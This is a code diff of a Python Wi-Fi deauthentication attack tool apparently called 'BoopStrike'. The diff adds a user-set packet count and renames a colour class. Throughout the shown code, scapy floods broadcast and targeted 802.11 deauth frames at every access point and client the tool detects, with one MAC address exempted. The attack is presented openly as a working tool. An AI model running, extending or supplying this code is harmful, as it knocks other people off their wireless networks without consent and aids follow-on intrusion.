@@ -41,7 +41,7 @@ Deauth_Dict = {"Client":[], "APS": []}
 
 
 # CLASSES
-class bcolors:
+class c:
     HEADER    = "\033[95m"
     OKBLUE    = "\033[94m"
     OKGREEN   = "\033[92m"
@@ -67,7 +67,7 @@ class Configuration:
         if interface in pyw.interfaces() and pyw.modeget(interface) == "monitor":
             self.interface = interface
         else:
-            print(bcolors.FAIL + " [-] Non Monitor card selected.")
+            print(c.FAIL + " [-] Non Monitor card selected.")
             exit(0)
         return
 
@@ -92,7 +92,7 @@ class Configuration:
             elif str(self.frequency) == "5":
                 self.hop = True
             else:
-                print(bcolors.FAIL+" [-] Channel Setting incorrect.")
+                print(c.FAIL+" [-] Channel Setting incorrect.")
                 exit(0)
 
             self.channel = None
@@ -103,7 +103,7 @@ class Configuration:
             elif str(self.frequency) == "5" and int(channel) in _5_channels_:
                     self.hop = False
             else:
-                print(bcolors.FAIL+" [-] Channel Setting incorrect."+bcolors.ENDC)
+                print(c.FAIL+" [-] Channel Setting incorrect."+c.ENDC)
                 exit(0)
 
             self.channel = channel
@@ -116,6 +116,10 @@ class Configuration:
 
     def parse_skip(self, skip):
         self.skip = skip
+        return
+
+    def parse_packets(self, packets):
+        self.packets = int(packets)
         return
 
     def parse_args(self):
@@ -169,6 +173,14 @@ class Configuration:
             dest="skip",
             help="Mac to not deauth (Usually your own...)")
 
+        parser.add_argument(
+            "-p",
+            "--packets",
+            action="store",
+            default=1,
+            dest="packets",
+            help="How many deauth packets to send, more than 5 is usually unneccessary.")
+
         results = parser.parse_args()
 
         self.parse_interface(results.interface)
@@ -176,19 +188,20 @@ class Configuration:
         self.parse_channel(results.channel)
         self.parse_mac_filter(results.access_mac)
         self.parse_skip(results.skip)
+        self.parse_packets(results.packets)
 
         self.user_force_variables_static()
         return
 
     def check_root(self):
         if getuid() != 0:
-            print(bcolors.FAIL+" [-] User is not Root.")
+            print(c.FAIL+" [-] User is not Root.")
             exit()
         return
 
     def check_op(self):
         if uname()[0].startswith("Linux") and not "Darwin" not in uname()[0]:
-            print(bcolors.FAIL+" [-] Wrong OS.")
+            print(c.FAIL+" [-] Wrong OS.")
             exit()
         return
 
@@ -216,8 +229,8 @@ def handler_beacon(packet):
         Deauth_Dict["APS"].append( [mac, configuration.channel, name[:15]] )
 
     if mac != configuration.skip:
-        send(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Deauth(), inter=(0.05), count=(1))
-
+        send(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Deauth(), inter=(0.05), count=(configuration.packets))
+        
     return
 
 
@@ -232,7 +245,7 @@ def handler_data(packet):
 
     if address1 in Access_Points:
         if address2 != configuration.skip and address1 != configuration.skip:
-            send(Dot11(addr1=address2, addr2=address1, addr3=address1)/Dot11Deauth(), inter=(0.0), count=(1))
+            send(Dot11(addr1=address2, addr2=address1, addr3=address1)/Dot11Deauth(), inter=(0.0), count=(configuration.packets))
 
             if address2 not in Clients:
                 Clients.append(address2)
@@ -240,7 +253,7 @@ def handler_data(packet):
 
     elif address2 in Access_Points:
         if address1 != configuration.skip and address2 != configuration.skip:
-            send(Dot11(addr1=address1, addr2=address2, addr3=address2)/Dot11Deauth(), inter=(0.0), count=(1))
+            send(Dot11(addr1=address1, addr2=address2, addr3=address2)/Dot11Deauth(), inter=(0.0), count=(configuration.packets))
 
             if address1 not in Clients:
                 Clients.append(address1)
@@ -372,10 +385,10 @@ def printer(configuration):
 
         system('clear')
 
-        print(bcolors.ENDC+"[+] Time: [" + printable_time + "] Striking: ["+str(configuration.channel)+"]")
+        print(c.ENDC+"[+] Time: [" + printable_time + "] Striking: ["+str(configuration.channel)+"]")
         print("")
         print(tabulate(wifis, headers=["Mac Addr", "Ch", "SSID"], tablefmt=typetable))
-        print(bcolors.ENDC)
+        print(c.ENDC)
         print(tabulate(clients, headers=["Mac", "AP Mac", "Ch"], tablefmt=typetable))
 
         if timeout < 4:
@@ -401,7 +414,7 @@ def int_main(configuration):
         Print_Flag = False
         Channel_Hopper_Flag  = False
 
-        print(bcolors.OKGREEN+"\r [+] "+bcolors.ENDC+"Commit to Exit.")
+        print(c.OKGREEN+"\r [+] "+c.ENDC+"Commit to Exit.")
         exit(0)
         return 0
 
@@ -430,7 +443,7 @@ def int_main(configuration):
 
 
 def display_art():
-    print(bcolors.OKBLUE+"""
+    print(c.OKBLUE+"""
   ____                    _____ _        _ _
  |  _ \                  / ____| |      (_) |
  | |_) | ___   ___  _ __| (___ | |_ _ __ _| | _____
@@ -440,7 +453,7 @@ def display_art():
                    | |
                    |_|
     """)
-    print(bcolors.HEADER+"     Codename: Inland Taipan\r\n"+bcolors.BOLD)
+    print(c.HEADER+"     Codename: Inland Taipan\r\n"+c.BOLD)
     return
 
 
